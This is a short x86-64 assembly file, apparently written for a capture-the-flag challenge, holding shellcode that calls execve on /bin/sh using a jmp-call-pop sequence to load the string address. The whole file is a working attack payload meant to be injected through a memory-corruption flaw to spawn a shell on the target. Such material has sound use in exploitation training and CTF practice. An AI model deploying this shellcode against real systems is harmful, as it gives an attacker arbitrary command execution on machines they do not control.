; Author: Muzaffer Umut ŞAHİN
; Description: Basic execve("/bin/sh",NULL,NULL) shellcode for the chall.

section .text
global _start

_start:
 push 59
 pop rax
 xor edx,edx
 push rdx
 pop rsi
 jmp get_bin_sh

continue:
 pop rdi
 syscall
 ret
 
get_bin_sh:
 call continue
 db "/bin/sh",0


